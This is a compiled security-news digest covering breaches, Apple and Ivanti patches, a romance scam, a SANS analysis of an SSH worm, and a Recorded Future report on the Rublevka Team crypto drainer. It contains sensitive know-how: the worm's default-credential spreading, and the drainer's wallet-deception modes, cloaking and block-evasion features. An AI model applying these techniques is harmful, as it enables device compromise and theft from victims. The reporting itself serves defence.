“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Apple fixed first actively exploited zero-day in 2026
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 10:50:10 +0000
Link: https://securityaffairs.com/187890/security/apple-fixed-first-actively-exploited-zero-day-in-2026.html

[TAM METİN - 428 kelime]
Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

“An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26. CVE-2025-14174 and CVE-2025-43529 were also issued in response to this report.” reads the advisory published by Apple.

Apple fixed both CVE-2025-14174 and CVE-2025-43529 in December 2025 after reports of active exploitation.

CVE-2025-14174 is an out of bounds memory access in ANGLE in Google Chrome on Mac prior to 143.0.7499.110. A remote attacker can exploit the flaw to perform out of bounds memory access via a crafted HTML page.

Google first flagged CVE-2025-14174 (CVSS 8.8), an out-of-bounds memory flaw in ANGLE’s Metal renderer, which could allow code execution. CVE-2025-43529 (CVSS 8.8) is a WebKit use-after-free bug that could also let attackers run code through malicious web content. Updates are available for supported Apple devices and operating systems.

The vulnerability CVE-2025-43529 is a use-after-free flaw in Apple’s WebKit engine, the component responsible for processing web content. When WebKit mishandles memory, it may continue to access a portion of memory after it has already been freed. By delivering specially crafted web content, an attacker can trigger this condition, causing memory corruption. In practice, this can lead to application crashes or, in more serious cases, arbitrary code execution. The issue affects Safari and any Apple or third-party applications that rely on WebKit to parse and render HTML across iOS, iPadOS, macOS, and related platforms.

The IT giant addressed the memory corruption issue CVE-2026-20700 with improved state management.

The vulnerability was addressed with iPhone 11 and later, iPad Pro 12.9-inch 3rd generation and later, iPad Pro 11-inch 1st generation and later, iPad Air 3rd generation and later, iPad 8th generation and later, and iPad mini 5th generation and later.

The security updates are now available for supported Apple devices across the latest iOS, iPadOS, macOS, watchOS, tvOS, and visionOS versions:

IApple also rolled out security updates to fix multiple vulnerabilities in older versions of iOS, iPadOS, macOS, and Safari:

Ivanti released patches for more than a dozen vulnerabilities in Endpoint Manager, including flaws disclosed in October 2025. The update addresses a high-severity authentication bypass, tracked as CVE-2026-1603 (CVSS score of 8.6), that attackers could exploit remotely without credentials to access and steal sensitive login information.

An authentication bypass in Ivanti Endpoint Manager before version 2024 SU5 allows a remote unauthenticated attacker to leak specific stored credential data.

“An authentication bypass in Ivanti Endpoint Manager before version 2024 SU5 allows a remote unauthenticated attacker to leak specific stored credential data.” reads the advisory.

The company also fixed a medium-severity SQL injection, tracked as CVE-2026-1602 (CVSS score of 6.5), in Ivanti Endpoint Manager.

“SQL injection in Ivanti Endpoint Manager before version 2024 SU5 allows a remote authenticated attacker to read arbitrary data from the database.” continues the advisory.

Trend Micro’s ZDI reported the flaws to Ivanti in November 2024, threat actors could exploit the bugs to escalate privileges and run code remotely.

The company said it is not aware of attacks in the wild exploiting these vulnerabilities before public disclosure.

In December, the software firm addressed a newly disclosed vulnerability, tracked as CVE-2025-10573 (CVSS score 9.6), in its Endpoint Manager (EPM) solution.

The vulnerability is a Stored XSS that could allow a remote unauthenticated attacker to execute arbitrary

“Stored XSS in Ivanti Endpoint Manager prior to version 2024 SU4 SR1 allows a remote unauthenticated attacker to execute arbitrary JavaScript in the context of an administrator session. User interaction is required.” reads the advisory.

[TAM METİN - 394 kelime]
A data breach at business services provider Conduent has impacted at least 25 million people, far more than initially reported. Volvo Group North America confirmed that the security breach exposed data of nearly 17,000 of its employees, making it one of several major companies affected by the large-scale breach.

SecurityWeek reports that the breach now affects far more people than first thought: Texas sees 15 million impacted (up from 4 million) and over 10 million individuals in Oregon are also affected.

In November 2025, the company confirmed that January 2025 breach exposed the personal data of over 10M people, including names, addresses, DOBs, SSNs, and health and insurance info.

In April 2025, the business services provider revealed that personal information, including names and Social Security numbers, was stolen in a January cyberattack.

In January, the company announced that a cyberattack caused service disruptions after agencies in multiple US states reported outages. Wisconsin and Oklahoma noted impacts on payments and customer support.

Conduent disclosed that hackers accessed its network from October 21, 2024, to January 13, 2025, stealing personal data of users, including SSNs, DOBs, addresses, and health info. The company notified affected individuals and is offering free identity protection.

The Safepay ransomware group claimed the attack in February 2025.

Conduent, which provides printing, mailroom, document processing, payment integrity, and other back-office services, notified individuals about a data breach on behalf of Volvo Group. Volvo told the Maine Attorney General that 16991 employees were affected. The company said it only became aware of the incident in January 2026, months after the breach occurred.

“On behalf of our clients, Conduent Business Services, LLC (“Conduent”) provides third-party printing/mailroom services, document processing services, payment integrity services, and other back-office support services. We are writing to inform you about a recent incident experienced by Conduent that may have involved some of your personal information, which came into our possession due to the services that we provide to your current or former health plan.” reads the data breach notification sent to the impacted individuals and shared with the Maine Attorney General Office. “While we are unaware of any attempted or actual misuse of any information involved in this incident, we are providing you with information about the incident and steps you can take to protect yourself, should you feel it necessary.”

[16] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[18] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 653 kelime]
An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.

That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.

The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.

The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.

Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.

Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.

Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.

In total, she sent over US $2.5 million before realising that she had fallen victim to a con.

But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.

Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.

Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.

Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.

Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.

But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.

Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.

A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.

Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.

The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.

Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.

Four Seconds to Botnet - Analyzing a Self Propagating SSH Worm with Cryptographically Signed C2 [Guest Diary]

[This is a Guest Diary by Johnathan Husch, an ISC intern as part of the SANS.edu BACS program]

Weak SSH passwords remain one of the most consistently exploited attack surfaces on the Internet. Even today, botnet operators continue to deploy credential stuffing malware that is capable of performing a full compromise of Linux systems in seconds.

During this internship, my DShield sensor captured a complete attack sequence involving a self-spreading SSH worm that combines:

- Credential brute forcing
- Multi-stage malware execution
- Persistent backdoor creation

Figure 1: Network diagram of observed attack

Authentication Activity

The attack originated from 83.135.10.12, which traces back to Versatel Deutschland, an ISP in Germany [1]. 
The threat actor connected using the following SSH client:
SSH-2.0-OpenSSH_8.4p1 Raspbian-5+b1
HASSH: ae8bd7dd09970555aa4c6ed22adbbf56
The 'raspbian' strongly suggests that the attack is coming from an already compromised Raspberry Pi.

Post Compromise Behavior

Once the threat actor was authenticated, they immediately uploaded a small malicious bash script and executed it. 
Below is the attackers post exploitation sequence:

The uploaded and executed script was a 4.7KB bash script captured by the DShield sensor. The script performs a full botnet lifecycle. The first action the script takes is establishing persistence by performing the following:

The threat actor then kills the processes for any competitors malware and alters the hosts file to add a known C2 server [2] as the loopback address

Interestingly, an embedded RSA key was active and was used to verify commands from the C2 operator. The script then joins 6 IRC networks and connects to one IRC channel: #biret

Once connected, the C2 server finishes enrollment by opening a TCP connection, registering the nickname of the device and completes registration. From here, the C2 performs life checks of the device by quite literally playing ping pong with itself. If the C2 server sends down "PING", then the compromised device must send back "PONG".

Lateral Movement and Worm Propagation

Once the C2 server confirms connectivity to the compromised device, we see the tools zmap and sshpass get installed. The device then conducts a zmap scan on 100,000 random IP addresses looking for a device with port 22 (SSH) open. For each vulnerable device, the worm attempts two sets of credentials:

- pi / raspberry
- pi / raspberryraspberry993311

Upon successful authentication, the whole process begins again. 
While a cryptominer was not installed during this attack chain, the C2 server would most likely send down a command to install one based on the script killing processes for competing botnets and miners.

Why Does This Attack Matter

This attack in particular teaches defenders a few lessons:

Weak passwords can result in compromised systems. The attack was successful as a result of enabled default credentials; a lack of key based authentication and brute force protection being configured. 
IoT Devices are ideal botnet targets. These devices are frequently left exposed to the internet with the default credentials still active.
Worms like this can spread both quickly and quietly. This entire attack chain took under 4 seconds and began scanning for other vulnerable devices immediately after.

How To Combat These Attacks

To prevent similar compromises, organizations could:

- Disable password authentication and use SSH keys only
- Remove the default pi user on raspberry pi devices
- Enable and configure fail2ban
- Implement network segmentation on IoT devices

This incident demonstrates how a raspberry pi device with no security configurations can be converted into a fully weaponized botnet zombie. It serves as a reminder that security hardening is essential, even for small Linux devices and hobbyist systems.

Apple Patches Everything: February 2026

Today, Apple released updates for all of its operating systems (iOS, iPadOS, macOS, tvOS, watchOS, and visionOS). The update fixes 71 distinct vulnerabilities, many of which affect multiple operating systems. Older versions of iOS, iPadOS, and macOS are also updated.

OF special note is CVE-2026-20700. This vulnerability has already been exploited in targeted attacks. It allows attackers who can write to memory to execute code. Two vulnerabilities patched in December are related to the same attack (CVE-2025-14174 and CVE-2025-43529).

Interesting are additional Siri/Voice Over vulnerabilities that allow access to some information on locked devices. This is a recurring issue, and you should probably turn off VoiceOver and Siri on locked devices. Another recurring and likely impossible to completely eliminate threat is applications being able to access data from other applications. To reduce the probability of exploitation, limit the Apps you install on your devices.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[23] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[24] Recorded Future - Rublevka Team: Anatomy of a Russian Crypto Drainer Operation

Rublevka Team: Anatomy of a Russian Crypto Drainer Operation

Insikt Group has identified a major cybercriminal operation specializing in large-scale cryptocurrency theft, operating under the moniker “Rublevka Team”. Since its inception in 2023, the threat group has generated over $10 million through affiliate-driven wallet draining campaigns. Rublevka Team is an example of a “traffer team,” composed of a network of thousands of social engineering specialists tasked with directing victim traffic to malicious pages. Unlike traditional malware-based approaches such as those used by the traffer teams Marko Polo and CrazyEvil (previously identified by Insikt Group, both of which distributed infostealer malware), Rublevka Team deploys custom JavaScript scripts via spoofed landing pages that impersonate legitimate crypto services, tricking victims into connecting their wallets and authorizing fraudulent transactions. Their infrastructure is fully automated and scalable, offering affiliates access to Telegram bots, landing page generators, evasion features, and support for over 90 wallet types. By lowering the technical barrier to entry, Rublevka Team has built an extensive ecosystem of global affiliates capable of launching high-volume scams with minimal oversight.

This structure poses a growing threat to cryptocurrency platforms, fintech providers, and brands whose identities are being impersonated. Organizations that facilitate blockchain transactions, particularly fintech firms, exchanges, or wallet providers, face elevated reputational and legal risks if customers fall victim to these scams. Even if the victim’s compromise occurs outside a firm’s platform, failure to detect spoofed landing pages or fraudulent referrals can trigger consumer backlash, loss of trust, or regulatory scrutiny around customer protections and Know Your Customer (KYC) enforcement. The threat group’s agility — evidenced by its use of frequently rotating domains, targeting lower-cost chains like Solana (SOL), and exploiting Remote Procedure Call (RPC) APIs — undermines traditional fraud detection and domain takedown efforts. Their model mirrors ransomware-as-a-service (RaaS) operations, signaling a continuation of the broader shift toward scalable, service-based cybercrime that organizations must proactively monitor, disrupt, and defend against to protect customers and maintain trust.

The objective of a Rublevka Team scam is to create an attractive SOL-based offer, such as a promotion or an airdrop event, generate traffic to the lure via social media or advertisements, and trick a user into connecting their wallet to the website and signing a transaction that drains their wallet.

As of writing, Rublevka Team’s primary Telegram channel has approximately 7,000 members. Over 240,000 messages have been posted to Rublevka Team’s automated “profits” channel, indicating at least 240,000 successful wallet drains, with transactions ranging from $0.16 to over $20,000.

Rublevka Team offers a custom JavaScript drainer embedded into their landing pages, which exfiltrates victims’ SOL assets by draining held tokens. The drainer is compatible with over 90 SOL wallet types.

The threat group’s infrastructure is fully automated via Telegram bots, offering affiliates tools for landing page creation, campaign tracking, cloaking, and distributed denial-of-service (DDoS) protection.

The drainer campaign, active since 2023, leverages spoofed versions of legitimate services such as Phantom, Bitget, and Jito to maximize user trust and conversion

Insikt Group has been monitoring Rublevka Team since August 2025, when we first encountered the threat group’s advertisement banner on Exploit Forum. The name “Rublevka Team” is likely a reference to the Rublevka neighborhood of Moscow, a prestigious and wealthy suburb largely populated by elite Russian businesspeople and government officials. Like other traffer teams previously reported by Insikt Group, such as Marko Polo and Crazy Evil, Rublevka Team is a “cryptoscam” team primarily operating on LolzTeam Forum, as well as maintaining a smaller presence on high-tier forums Exploit and XSS. However, in contrast to the traffer teams previously reported by Insikt Group, Rublevka Team does not rely on infostealer malware to target victims; instead, it operates a drainer script embedded in its landing pages to connect to victims’ cryptocurrency wallets and drain their funds.

Based on analysis by Insikt Group, Rublevka Team has been active since 2023, when it was first launched on LolzTeam Forum by the user “denisssss_inactive”. Based on an analysis of its reported profits within its private channel, Rublevka Team has a lifetime revenue of over $10 million USD as of the time of writing. The team’s tactics, techniques, and procedures (TTPs) have evolved since it began operations in 2023. Originally, the threat group operated fake cryptocurrency exchanges to convince users to connect their wallets and deposit funds, focusing on generating traffic through Instagram and, later, TikTok. In 2024, however, Rublevka Team fundamentally shifted its tactics to deploy a custom JavaScript-based cryptocurrency wallet drainer on its landing pages, which impersonated cryptocurrency token airdrops and giveaways. The threat group initially targeted The Open Network (TON), then shifted to SOL in spring 2025. Its latest campaign, which is ongoing as of writing, has generated the majority of its total revenue (approximately $8.2 million).

Rublevka Team Operations

Affiliate Recruitment

Rublevka Team’s latest post on LolzTeam Forum, which was published by denisssss_inactive on April 18, 2025, advertises Rublevka Team’s SOL drainer scam program. Since Rublevka Team’s original postings advertising its cryptocurrency exchange scams and TON token campaigns, the payout rates have shifted significantly in affiliates’ favor, with a starting percentage of 75% and 80% for “experienced users.” The increase in commission rates for starting affiliates may indicate a shift over time in the team’s monetization strategies based on the financial success the threat group has seen; it may now be more favorable to prioritize expanding the pool of workers rather than extracting maximum income from any individual affiliate.

The post also advertises a fully automated Telegram bot for conducting operations, a landing page generator, and free domains and hosting services with included cloaking features and distributed denial-of-service (DDoS) protections. The advertisement also describes the SOL drainer used on the landing pages, which supports over 90 wallet types, draining capabilities for SOL, Solana Program Library (SPL) tokens (including SPL2022 extension tokens), non-fungible tokens (NFTs), and Native Stake, spoofing and bypass features for Phantom wallet, a drainer API, and over 35 ready-to-use landing pages integrated with the drainer.

The posts do not specify any hard requirements for prospective affiliates, who are instructed to apply for the team via the Telegram bot [@]RublevkaTeam_Bot. Applications are likely vetted by Rublevka Team’s leader, denisssss_inactive, or the administrative team (“Jesse Pinkman” and “Shell” at the time of writing).

Once an applicant is accepted to Rublevka Team, they are directed to join the following private channels:

“[RublevkaTeam] Chat”: Closed group chat with messages dating back to May 2024, with 6,821 members as of writing

“[RublevkaTeam] Info”: An informational channel posting updates to the drainer and affiliate program; the threat group also operates a Russian-language version of this channel, “[Rublevka Team] Инфо”

“[RublevkaTeam] Landing pages”: Repository of screenshots of new landing pages used by Rublevka Team

“RublevkaTeam_bot (@RublevkaTeam_Bot)”: Handles group applications and serves as an administrative panel for affiliate campaigns

“Rublevka Utils (@RublevkaUtils_bot)”: Used for generating custom landing pages and video content for traffic generation

Rublevka Team hosts an informational manual for affiliates on the domain rublevkateam[.]cc. This manual outlines the procedures for working on the team, including how to use the Telegram bot, how to conduct cryptoscams, how to configure the drainer, and more.

The stated goal of the Rublevka Team scam is to create a “drainer-based offer” (usually a promotion, an airdrop notice, a KYC request, or other) and to attract traffic to the website. From the perspective of a victim (referred to as a “lead”), they will encounter the website, connect their cryptocurrency wallet to the website, and then receive an offer to perform a crypto transaction. Upon confirming and signing the transaction, all assets from the lead’s wallet are transferred to the website’s operator.

According to the manual, the team opted for SOL due to its fast transaction time and low fees, as well as its support for smart contracts, decentralized apps (dApps), and NFTs. The manual includes a table of popular wallets that support SOL and are compatible with the Rublevka drainer, which includes Solflare, Phantom, Backpack, Coinbase, Bitget, OKX, Metamask, and others.

Notably, configuration for an affiliate’s campaign is done within the [@]RublevkaTeam_bot, which is available in English, Russian, and Chinese, and in most cases requires no interaction with the support team. This provides affiliates with full control and visibility into their own campaigns.

Rublevka Team affiliates have three options when creating a domain for hosting a landing page:

“Shared domain”: This type of domain is provided by Rublevka Team and is shared among multiple team members. This option is free of charge but has a higher chance of being blocked and comes with a preset list of names. With this option, a user chooses a custom subdomain, which is hosted under a shared apex domain managed by Rublevka Team and periodically rotated by administrators. Users on a shared domain have no control over the IP address of their website. This option has experienced continuous disruptions from December 2025 into 2026.

“Private domain”: An affiliate provides a private domain, which they purchase and configure themselves. This option has minimal risk of being blocked and provides users with full control over their own hosting.

“Self-host”: With this option, the affiliate can host the SOL drainer backend on a Rublevka Team-operated domain for free, with the intent that the affiliate invokes the script from their own privately hosted website.

Users can also choose to register subdomains of their private domain using the bot, with each subdomain functioning as a fully autonomous landing page.

Once a domain is created, the affiliate can configure their landing page. Within the bot, the user has the option to create either a “regular” page, which includes a drainer, or a “white” page, which does not have a drainer and is used to evade abuse detection services. The white pages are used as part of the “Red Table Bypass” feature, designed to unblock a domain that has been blocked by Google by temporarily displaying a harmless web page. In both cases, the user has the option to choose from a wide selection of pre-created landing pages.

Alternatively, users can choose to generate their own landing page based on a template, which can be customized to a token of the user’s choice. They can also choose to “copy” an existing website by providing a URL to the bot; however, as of writing, this functionality appears to be broken.

In addition to generating landing pages, the Telegram bot also allows users to configure “cloaking settings” for their domains. Cloaking is a technique used by cybercriminals that involves presenting website content to a search engine in a way that differs from what the victim will see after navigating to the website. However, Rublevka Team uses the term to describe access restrictions for users from certain countries, IP addresses, internet service providers (ISPs), or virtual private network (VPN) or proxy users. Affiliates can also configure redirect logic and CAPTCHAs via Cloudflare to redirect victims to another landing page if the primary domain is blocked; they can also filter out bots to reduce the likelihood of the domain being blocked. The Telegram bot also supports configurations that allow only the user’s domain to open as a Telegram Mini App for Telegram-based traffic schemes, as well as the option to block specific “leads” (victims).

Rublevka Team affiliates can configure the settings for the drainer to fit their specific needs. The drainer can display a custom fake transaction for receiving SOL or a fake token, based on the contents of an affiliate’s landing page, and can be configured to display a fake credit for each asset drain operation on the wallet. Affiliates can also set up minimum balance alerts to lure victims into buying additional SOL to use on their landing page.

The drainer has additional settings specifically for Phantom wallet, which the manual states is one of the most popular SOL wallets and can allow for a significant boost in “traffic conversion.” The drainer supports the following Phantom wallet “modes,” which are ways to connect with a user’s Phantom wallet to convince a user to sign a malicious drainer transaction:

“Honeypot”: This mode relies on a fake incoming token or SOL receipt to prime the user before initiating a visible drain transaction. The drain is shown as an outgoing transfer, but Phantom does not flag it as risky. Fake receipts only render correctly for tokens installable through Phantom’s UI (not arbitrary custom tokens). A modal window falsely claims that the drained assets will be returned via a second transaction.

“Honeypot2”: Honeypot2 expands on Honeypot by requiring two transactions. The user first sees a fake inbound transfer, then approves a follow-on transaction that performs the drain. When combined with Crasher, the second transaction may appear as a simulation error rather than a clear debit. As with Honeypot, a modal window falsely claims that a refund will follow.

“Fake Return”: Unlike Honeypot, this mode does not simulate inbound funds; instead, it shows a straightforward outgoing transfer that appears legitimate. After a user signs the transaction, a modal window falsely claims that a second “return” transaction will refund the assets.

“Crasher”: This is a stealth-focused drain designed to complete in one interaction with minimal user review. Phantom displays a generic warning commonly seen on legitimate sites, reducing suspicion through familiarity. There is no fake inbound activity or refund narrative. This mode is considered experimental and is replaced by Honeypot behavior on mobile devices.

